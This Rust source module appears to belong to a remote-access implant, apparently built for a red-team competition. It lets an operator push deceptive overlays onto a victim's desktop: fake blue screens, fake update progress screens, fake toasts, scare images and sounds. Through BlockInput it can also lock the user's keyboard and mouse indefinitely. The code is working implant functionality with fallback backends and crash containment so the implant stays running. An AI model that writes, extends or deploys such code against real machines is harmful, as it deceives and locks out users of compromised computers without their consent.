//! Overlay host.
//!
//! ## Why one thread and many viewports
//!
//! winit permits exactly one `EventLoop` per process, and eframe wraps winit. So
//! "spawn a thread per overlay, each with its own eframe window" cannot work -
//! the second `run_native` would fail. The shape that does work is a single
//! long-lived thread owning the one event loop, with each overlay created as an
//! egui *viewport* from that one app.
//!
//! This is why overlays are dispatched rather than run inline. The Web UI gives
//! a task 90 seconds (`TASK_TIMEOUT_MS` in `webui/assets/js/agents.js`), and
//! Tombili executes `command.function(task)` on the check-in loop, so anything
//! slow would stall check-ins and the console would report a timeout even though
//! the overlay was working. Every visual command here returns an ack string
//! immediately.
//!
//! Overlays are closed by a deadline checked in the app's `update`, and by a
//! cancel token that `stop_all` sets from the check-in thread. The token is
//! needed because a stop can race a request that has been queued but not yet
//! picked up by the GUI thread; `STOP_EPOCH` covers that case by letting a
//! request know it was submitted before the most recent stop and cancelling it
//! the moment the GUI thread sees it.
//!
//! ## Two backends
//!
//! eframe needs a working OpenGL 3.2 implementation, and plenty of targets do
//! not have one - a VM with 3D acceleration disabled, or an RDP session. There it
//! fails during context creation, before the first frame, and it does so with a
//! panic from inside glutin rather than an error worth reading. So eframe is
//! tried first and the dependency-free GDI backend in `crate::gdi` second, and
//! the choice is remembered for the life of the process so the dead one is not
//! retried on every command. `host_status` reports which is live.

use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::mpsc::{self, Receiver, Sender};
use std::sync::{Arc, Mutex, OnceLock};
use std::time::{Duration, Instant, SystemTime};

mod overlay;
pub mod win;

/// What to draw. Mirrors the visual commands in `commands.rs`.
///
/// `Clone` because `submit` may have to build a second request when the backend
/// it first chose turns out to be dead, and the `String`s are small and only
/// copied on that path.
#[derive(Clone)]
pub enum Overlay {
    Image {
        path: String,
        mode: String,
        topmost: bool,
    },
    Scare {
        path: String,
    },
    Bsod {
        stopcode: String,
        percent: i64,
    },
    Update {
        title: String,
        percent: i64,
    },
    Toast {
        title: String,
        body: String,
    },
    Note {
        text: String,
        x: i64,
        y: i64,
        size: i64,
    },
    Spook {
        mode: String,
    },
}

impl Overlay {
    /// Short name used in listings and ack strings.
    pub fn label(&self) -> &'static str {
        match self {
            Overlay::Image { .. } => "image",
            Overlay::Scare { .. } => "scare",
            Overlay::Bsod { .. } => "fakebsod",
            Overlay::Update { .. } => "fakeupdate",
            Overlay::Toast { .. } => "faketoast",
            Overlay::Note { .. } => "desktopnote",
            Overlay::Spook { .. } => "spook",
        }
    }
}

/// A request handed to whichever backend is running.
pub(crate) struct Request {
    pub id: u64,
    pub kind: Overlay,
    pub duration: Option<Duration>,
    pub cancel: Arc<AtomicBool>,
    pub epoch: u64,
}

/// What the check-in thread can see about a running overlay. Owned by the GUI
/// thread; the check-in thread only reads it and sets the cancel token.
pub struct Active {
    pub id: u64,
    pub label: &'static str,
    pub born: SystemTime,
    pub deadline: Option<Instant>,
    pub cancel: Arc<AtomicBool>,
}

static ACTIVE: OnceLock<Arc<Mutex<HashMap<u64, Active>>>> = OnceLock::new();
static NEXT_ID: AtomicU64 = AtomicU64::new(1);
static STOP_EPOCH: AtomicU64 = AtomicU64::new(0);

fn registry() -> &'static Arc<Mutex<HashMap<u64, Active>>> {
    ACTIVE.get_or_init(|| Arc::new(Mutex::new(HashMap::new())))
}

/// The renderer an overlay host is using.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum Backend {
    /// `gui/overlay.rs`. Needs OpenGL 3.2, and looks the better of the two.
    Egui,
    /// `crate::gdi`. Needs nothing but GDI.
    Gdi,
}

impl Backend {
    fn label(self) -> &'static str {
        match self {
            Backend::Egui => "eframe",
            Backend::Gdi => "gdi",
        }
    }
}

/// How long a newly started backend is given to fail before it is called working.
///
/// The failure being guarded against happens during startup - eframe's OpenGL
/// context is created before its first frame - so a thread still running after
/// this window is one that got past it. Deliberately not long: a working host
/// should not delay the operator's first prank, and the GDI backend is only
/// reached once per process anyway.
const STARTUP_PROBE: Duration = Duration::from_millis(300);

/// The channel to the overlay thread, plus the reason it is not usable.
///
/// A `Mutex<Option<..>>` rather than a `OnceLock`, deliberately. A backend can
/// die for reasons that are nobody's fault, and a `OnceLock` cannot be
/// re-initialised. One failure would then poison every overlay command for the
/// life of the process with a message that named none of the cause. Bringing the
/// thread back up is cheap, so it is done.
struct Host {
    sender: Option<Sender<Request>>,
    /// Kept only so `is_finished` can be asked. A finished thread has dropped
    /// its `Receiver`, which is what turns every later `send` into a failure.
    handle: Option<std::thread::JoinHandle<()>>,
    backend: Option<Backend>,
}

static HOST: OnceLock<Mutex<Host>> = OnceLock::new();

/// Why the last backend stopped, recorded by the dying thread.
///
/// Deliberately *not* inside `Host`. A backend that fails during startup does so
/// on its own thread, and it has to be able to record why without waiting on the
/// host lock - because `sender` holds that lock across the startup probe in
/// order to see the thread die. A `Mutex<Option<String>>` rather than an
/// `AtomicU64` index into a table, because the reason is a `String` and the whole
/// point is to surface it.
static FAILURE: Mutex<Option<String>> = Mutex::new(None);

/// Backends that have been found not to work on this target.
///
/// Not a single flag, because a backend that dies *after* it was reported as
/// running has to be retired too - see `submit`. A `static` rather than a
/// `OnceLock` because the only state is "never try this again", and both flags
/// are read on the path of every visual command.
struct Unusable {
    egui: AtomicBool,
    gdi: AtomicBool,
}

static UNUSABLE: Unusable = Unusable {
    egui: AtomicBool::new(false),
    gdi: AtomicBool::new(false),
};

impl Unusable {
    fn get(&self, backend: Backend) -> bool {
        match backend {
            Backend::Egui => self.egui.load(Ordering::Relaxed),
            Backend::Gdi => self.gdi.load(Ordering::Relaxed),
        }
    }

    fn retire(&self, backend: Backend) {
        match backend {
            Backend::Egui => self.egui.store(true, Ordering::Relaxed),
            Backend::Gdi => self.gdi.store(true, Ordering::Relaxed),
        }
    }

    /// The backends still worth trying, best first.
    ///
    /// The retired one still appears, second, so that a target where both are
    /// dead gets a thread attempt and a real reason rather than the weaker
    /// "nothing is left to try". `sender` short-circuits that case.
    fn candidates(&self) -> [Backend; 2] {
        if self.get(Backend::Egui) {
            [Backend::Gdi, Backend::Egui]
        } else {
            [Backend::Egui, Backend::Gdi]
        }
    }

    /// True once neither backend is worth starting.
    fn exhausted(&self) -> bool {
        self.get(Backend::Egui) && self.get(Backend::Gdi)
    }
}

fn host() -> &'static Mutex<Host> {
    HOST.get_or_init(|| {
        Mutex::new(Host {
            sender: None,
            handle: None,
            backend: None,
        })
    })
}

/// Called by a backend's thread as it shuts down, so the check-in thread can
/// report *why* rather than only that something went wrong.
///
/// Takes no host lock. See `FAILURE` for why that matters. Clearing the cached
/// sender and handle is left to `sender`, which has to inspect them anyway and
/// can see for itself that the thread is gone.
pub(crate) fn record_host_failure(reason: String) {
    crate::log::log(&format!("overlay host stopped: {reason}"));

    match FAILURE.lock() {
        Ok(mut failure) => *failure = Some(reason),
        Err(_) => return,
    }

    // A backend's `on_exit`-equivalent only runs on a graceful shutdown, so a
    // failed or panicked host leaves its overlays behind as ghosts -
    // `listoverlays` would report them as running and `stopall` would count them.
    // Nothing is alive at this point, so clear them.
    if let Ok(mut active) = registry().lock() {
        active.clear();
    }
}

/// Whether an interactive desktop is reachable at all.
///
/// Without this the overlay thread starts, window creation fails, and the operator
/// gets an opaque error from a command that otherwise looks fine.
fn display_available() -> bool {
    crate::info::gui_available()
}

/// The outcome of trying to start a backend.
enum Started {
    Ready(Sender<Request>),
    Died(String),
}

/// Starts a backend, or reports why it could not stay up.
fn start(backend: Backend, entry: fn(Receiver<Request>)) -> Started {
    let (tx, rx) = mpsc::channel::<Request>();

    // Stale, so a later failure is not reported alongside a fresh thread that is
    // working.
    if let Ok(mut failure) = FAILURE.lock() {
        *failure = None;
    }

    let handle = std::thread::Builder::new()
        .name(format!("midas-{}", backend.label()))
        .spawn(move || entry(rx));

    let handle = match handle {
        Ok(handle) => handle,
        Err(e) => {
            return Started::Died(format!("could not start the {} thread: {e}", backend.label()))
        }
    };

    if !survives_startup(&handle) {
        return Started::Died(failure_reason().unwrap_or_else(|| {
            format!("the {} backend stopped during startup", backend.label())
        }));
    }

    let Ok(mut host) = host().lock() else {
        return Started::Ready(tx);
    };

    host.sender = Some(tx.clone());
    host.handle = Some(handle);
    host.backend = Some(backend);

    Started::Ready(tx)
}

/// Waits out `STARTUP_PROBE`, reporting whether the thread is still running.
fn survives_startup(handle: &std::thread::JoinHandle<()>) -> bool {
    let deadline = Instant::now() + STARTUP_PROBE;

    while Instant::now() < deadline {
        if handle.is_finished() {
            return false;
        }
        std::thread::sleep(Duration::from_millis(10));
    }

    !handle.is_finished()
}

fn failure_reason() -> Option<String> {
    FAILURE.lock().ok().and_then(|reason| reason.clone())
}

/// Returns the sender of the running host, starting one if needed, and which
/// backend it belongs to.
///
/// The backend comes back because a backend that turns out to be dead is only
/// useful to the caller if the caller can retire it. See `submit`.
///
/// Liveness is asked rather than assumed. The cached sender outlives a dead
/// thread, and sending on it only fails once an operator has already been told
/// an overlay opened, so the check happens before the ack is produced.
fn sender() -> Result<(Sender<Request>, Backend), String> {
    if !display_available() {
        return Err(
            "this session has no interactive desktop, so no window can be created".to_string(),
        );
    }

    {
        let Ok(mut host) = host().lock() else {
            return Err("overlay host state is poisoned".to_string());
        };

        // A dead thread's cached sender is dropped here rather than discovered at
        // the send below, which would be after the operator had been told the
        // overlay opened.
        if host.handle.as_ref().is_some_and(|h| h.is_finished()) {
            host.sender = None;
            host.handle = None;
            host.backend = None;
        }

        if let (Some(tx), Some(backend)) = (&host.sender, host.backend) {
            return Ok((tx.clone(), backend));
        }
    }

    // The lock is deliberately released for the rest of this function. A backend
    // that fails while starting records the reason in `FAILURE` and then returns,
    // and it can only reach that return while `survives_startup` is watching for
    // the thread to end - which it cannot do if the thread is stuck waiting on a
    // lock this function is holding.
    if UNUSABLE.exhausted() {
        return Err(format!(
            "the overlay host is not running: {}",
            failure_reason().unwrap_or_else(|| "no backend is usable".to_string())
        ));
    }

    let mut last = String::new();

    for backend in UNUSABLE.candidates() {
        match start(backend, entry_for(backend)) {
            Started::Ready(tx) => return Ok((tx, backend)),
            Started::Died(reason) => {
                crate::log::log(&format!(
                    "{} overlay backend unavailable: {reason}",
                    backend.label()
                ));
                UNUSABLE.retire(backend);
                last = reason;
            }
        }
    }

    Err(format!("the overlay host is not running: {last}"))
}

/// The thread entry point for a backend.
fn entry_for(backend: Backend) -> fn(Receiver<Request>) {
    match backend {
        Backend::Egui => overlay::run,
        Backend::Gdi => crate::gdi::run,
    }
}

fn submit(kind: Overlay, duration: Option<Duration>) -> Result<u64, String> {
    // One retry, and this is the part that makes the fallback reliable.
    //
    // `STARTUP_PROBE` is a guess at how long startup takes. When eframe finds no
    // OpenGL immediately the guess is generous enough and the retry never
    // happens - but software GL is slow, and a context that takes half a second
    // to fail looks alive to the probe. The probe then hands back a sender for a
    // thread that is already on its way out, and without a retry every later
    // command would start eframe again, watch it die again, and fail identically
    // - the fallback would never be reached at all, which is the exact situation
    // it exists for.
    //
    // Detecting the death on the send instead of trying to predict it costs one
    // attempt and has no window in which it can be wrong.
    let mut last = String::new();

    for _ in 0..2 {
        let (tx, backend) = sender()?;

        // Allocated per attempt rather than once, because a retry must be a
        // distinct overlay id - reusing the first would overwrite the registry
        // entry of an overlay that never opened.
        let id = NEXT_ID.fetch_add(1, Ordering::Relaxed);

        let request = Request {
            id,
            kind: kind.clone(),
            duration,
            cancel: Arc::new(AtomicBool::new(false)),
            epoch: STOP_EPOCH.load(Ordering::Relaxed),
        };

        if tx.send(request).is_ok() {
            return Ok(id);
        }

        last = failure_reason().unwrap_or_else(|| {
            format!(
                "the {} backend stopped while the command was being sent",
                backend.label()
            )
        });
        crate::log::log(&format!("{last}; retiring it"));

        UNUSABLE.retire(backend);
        forget_host(backend);
    }

    Err(format!("the overlay host is not running: {last}"))
}

/// Drops a retired backend's cached sender and handle.
///
/// Called on the failure path only, so the handle is detached rather than
/// joined - joining would block the check-in loop for however long the thread
/// takes to unwind, and there is nothing to collect.
fn forget_host(backend: Backend) {
    if let Ok(mut host) = host().lock() {
        if host.backend == Some(backend) {
            host.sender = None;
            host.handle = None;
            host.backend = None;
        }
    }
}

/// Whether the overlay host is running, which backend it is, and if it is not
/// running, why.
///
/// Surfaced by `sysinfo` so the situation is visible before a prank is sent
/// rather than discovered from a task result.
pub fn host_status() -> String {
    let mut status = match host().lock() {
        Ok(host) if host.handle.as_ref().is_some_and(|h| !h.is_finished()) => {
            let backend = host.backend.map(Backend::label).unwrap_or("unknown");
            format!("overlay host: running ({backend})")
        }
        // Dropped for the same reason `sender` drops it: the entry describes a
        // thread that no longer exists.
        Ok(mut host) => {
            if host.handle.as_ref().is_some_and(|h| h.is_finished()) {
                host.sender = None;
                host.handle = None;
                host.backend = None;
            }
            match failure_reason() {
                Some(reason) => format!("overlay host: not running - {reason}"),
                None => "overlay host: not started yet".to_string(),
            }
        }
        Err(_) => "overlay host: state is poisoned".to_string(),
    };

    if UNUSABLE.get(Backend::Egui) {
        status.push_str("; eframe unavailable, using gdi");
    }

    status
}

// ---------------------------------------------------------------------------
// Public surface used by commands.rs
// ---------------------------------------------------------------------------

pub fn open_image(
    path: &str,
    mode: &str,
    duration: Option<Duration>,
    topmost: bool,
) -> Result<u64, String> {
    require_readable_file(path)?;

    submit(
        Overlay::Image {
            path: path.to_string(),
            mode: mode.to_string(),
            topmost,
        },
        duration,
    )
}

pub fn open_scare(path: &str, duration: Option<Duration>) -> Result<u64, String> {
    require_readable_file(path)?;

    submit(
        Overlay::Scare {
            path: path.to_string(),
        },
        duration,
    )
}

pub fn open_bsod(stopcode: &str, percent: i64, duration: Option<Duration>) -> Result<u64, String> {
    submit(
        Overlay::Bsod {
            stopcode: stopcode.to_string(),
            percent,
        },
        duration,
    )
}

pub fn open_update(title: &str, percent: i64, duration: Option<Duration>) -> Result<u64, String> {
    submit(
        Overlay::Update {
            title: title.to_string(),
            percent,
        },
        duration,
    )
}

pub fn open_toast(title: &str, body: &str, duration: Option<Duration>) -> Result<u64, String> {
    submit(
        Overlay::Toast {
            title: title.to_string(),
            body: body.to_string(),
        },
        duration,
    )
}

pub fn open_note(
    text: &str,
    x: i64,
    y: i64,
    size: i64,
    duration: Option<Duration>,
) -> Result<u64, String> {
    submit(
        Overlay::Note {
            text: text.to_string(),
            x,
            y,
            size,
        },
        duration,
    )
}

pub fn open_spook(mode: &str, duration: Option<Duration>) -> Result<u64, String> {
    submit(
        Overlay::Spook {
            mode: mode.to_string(),
        },
        duration,
    )
}

/// Cancels every overlay - including any that is still queued - ends sound, and
/// releases any running input hold.
///
/// Returns how many overlays were running. A request submitted after this call
/// is unaffected, which is what makes `stopall` usable as a cleanup step in
/// front of a fresh prank.
pub fn stop_all() -> usize {
    // Bumping the epoch first means a request submitted after this point is
    // unaffected, while anything queued before it is cancelled on arrival.
    STOP_EPOCH.fetch_add(1, Ordering::SeqCst);

    // `PlaySoundW` has no process to kill and cannot be interrupted any other
    // way; re-issuing it with a null sound is the documented way to stop it.
    win::stop_sound();

    // A continuous `lockinput` is unblocked here. It has to be: there is
    // nothing else that can end one, and input held until nothing can end it is
    // the one outcome `stopall` exists to prevent.
    release_input_lock();

    let registry = registry();
    let Ok(active) = registry.lock() else {
        return 0;
    };

    let count = active.len();
    for entry in active.values() {
        entry.cancel.store(true, Ordering::SeqCst);
    }
    count
}

// ---------------------------------------------------------------------------
// Input hold (`lockinput`)
//
// `BlockInput` is a single system-wide flag: there is no handle to whoever set
// it, no way to ask who holds it, and clearing it clears it for everyone. So
// holds are serialised by generation rather than by handing out and revoking
// tokens. A hold is the current one or it is nothing; a superseded hold gives
// up without touching the flag, and `release_input_lock` (used by `stopall`)
// clears the flag directly and bumps the generation so the holder sees it no
// longer owns anything.
// ---------------------------------------------------------------------------

/// Serial number of the current input hold.
///
/// Incremented when a new hold starts and when `stopall` releases. A holder
/// unblocks only if it is still the current generation when its turn ends, so
/// an overtaken hold can never clear a newer one's block.
static INPUT_GEN: AtomicU64 = AtomicU64::new(0);

/// A running `lockinput` hold, so `sysinfo` and `stopall` can see and end it.
#[derive(Clone)]
struct InputHold {
    gen: u64,
    born: SystemTime,
}

static INPUT_HOLD: OnceLock<Mutex<Option<InputHold>>> = OnceLock::new();

fn input_hold() -> &'static Mutex<Option<InputHold>> {
    INPUT_HOLD.get_or_init(|| Mutex::new(None))
}

/// The generation of the current hold, read by `win::hold_input`.
pub(crate) fn current_input_gen() -> u64 {
    INPUT_GEN.load(Ordering::SeqCst)
}

/// Starts an input hold and returns immediately.
///
/// `seconds == 0` holds until `stopall`; anything else is an approximate
/// timeout (the worker polls, so the real release lands within 100 ms of the
/// mark). The `BlockInput` call itself happens on the worker thread, so an
/// implant that is not elevated acks optimistically and reports the refusal in
/// its own log, exactly as before - and clears the registry entry so `sysinfo`
/// never claims a lock exists when it does not.
pub fn lock_input(seconds: u64) -> Result<(), String> {
    let duration = if seconds == 0 {
        None
    } else {
        Some(Duration::from_secs(seconds))
    };

    // A new hold supersedes any running one. Bumping *before* the new holder
    // blocks means an older holder that finishes in the same instant sees it is
    // no longer current and does not clear the new block.
    let gen = INPUT_GEN.fetch_add(1, Ordering::SeqCst) + 1;

    if let Ok(mut hold) = input_hold().lock() {
        *hold = Some(InputHold {
            gen,
            born: SystemTime::now(),
        });
    }

    detach(move || {
        if let Err(e) = win::hold_input(gen, duration) {
            crate::log::log_lazy(|| format!("lockinput failed: {e}"));
        }

        // Clear the registry entry, but only if it still describes this hold -
        // a newer one may have taken over while the worker was finishing.
        if let Ok(mut hold) = input_hold().lock() {
            if hold.as_ref().is_some_and(|h| h.gen == gen) {
                *hold = None;
            }
        }
    });

    Ok(())
}

/// Whether a `lockinput` hold is registered as running.
pub fn input_lock_active() -> bool {
    input_hold()
        .lock()
        .map(|hold| hold.is_some())
        .unwrap_or(false)
}

/// The status line for `sysinfo`, or `None` when nothing is held.
pub fn input_lock_status() -> Option<String> {
    let hold = input_hold().lock().ok().and_then(|h| h.clone())?;
    let age = hold.born.elapsed().map(|d| d.as_secs()).unwrap_or(0);
    Some(format!("input lock: active for {age}s, until stopall"))
}

/// Ends any running input hold.
///
/// Idempotent and safe to call when nothing is held: clearing the flag is a
/// no-op for an unlocked system, which is how `stopall` can do it on every
/// call. The generation bump stops the holding thread from clearing the flag it
/// no longer owns - by the time it notices, `unblock_input` has already cleared
/// it, and re-clearing is harmless anyway.
pub fn release_input_lock() {
    INPUT_GEN.fetch_add(1, Ordering::SeqCst);
    win::unblock_input();
    if let Ok(mut hold) = input_hold().lock() {
        *hold = None;
    }
}

/// Checks a file exists and is readable before an ack is sent.
///
/// The GUI thread decodes the image itself, but by then the operator has
/// already been told the overlay launched. A cheap up-front check means a
/// mistyped path comes back as a failed task result instead of an ack for an
/// overlay that never appeared.
pub fn require_readable_file(path: &str) -> Result<(), String> {
    if path.trim().is_empty() {
        return Err("path is empty".into());
    }

    let metadata = std::fs::metadata(path).map_err(|e| format!("{path}: {e}"))?;
    if !metadata.is_file() {
        return Err(format!("{path} is not a file"));
    }

    Ok(())
}

pub fn describe_overlays() -> String {
    let registry = registry();
    let Ok(active) = registry.lock() else {
        return "overlay registry is poisoned".to_string();
    };

    if active.is_empty() {
        return "no overlays running".to_string();
    }

    let mut lines: Vec<String> = active
        .values()
        .map(|entry| {
            let age = entry
                .born
                .elapsed()
                .map(|d| d.as_secs())
                .unwrap_or(0);
            let lifetime = match entry.deadline {
                Some(deadline) => {
                    let left = deadline.saturating_duration_since(Instant::now()).as_secs();
                    format!("{age}s old, {left}s left")
                }
                None => format!("{age}s old, until stopall"),
            };
            format!("#{} {} ({lifetime})", entry.id, entry.label)
        })
        .collect();

    lines.sort();
    lines.join("\n")
}

/// Runs a blocking native call on a worker thread and returns immediately.
///
/// Used for everything that would otherwise hold the check-in loop: modal
/// dialogs, audio, window shaking, input blocking. Panics from raw OS calls are
/// contained so a failed prank cannot take the implant down mid-competition.
pub fn detach<F>(work: F)
where
    F: FnOnce() + Send + 'static,
{
    std::thread::spawn(move || {
        let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(work));
    });
}

// ---------------------------------------------------------------------------
// Called by the GUI thread
// ---------------------------------------------------------------------------

pub(crate) fn register_active(active: Active) {
    if let Ok(mut registry) = registry().lock() {
        registry.insert(active.id, active);
    }
}

pub(crate) fn unregister_active(id: u64) {
    if let Ok(mut registry) = registry().lock() {
        registry.remove(&id);
    }
}

pub(crate) fn current_stop_epoch() -> u64 {
    STOP_EPOCH.load(Ordering::SeqCst)
}

// ---------------------------------------------------------------------------
// Stopping things that block
//
// Windows needs none of the polling machinery a process-based backend would.
// `PlaySoundW` is in-process and is ended by calling it again with a null
// sound; a message box is dismissed with its own OK button; a blocked cursor is
// restored by the thread that moved it; a `BlockInput` hold is ended by
// clearing the system-wide flag directly (see `Input hold` above). `stop_all`
// reaches each of those directly, which is why it returns immediately rather
// than waiting for anything to wind down.
// ---------------------------------------------------------------------------
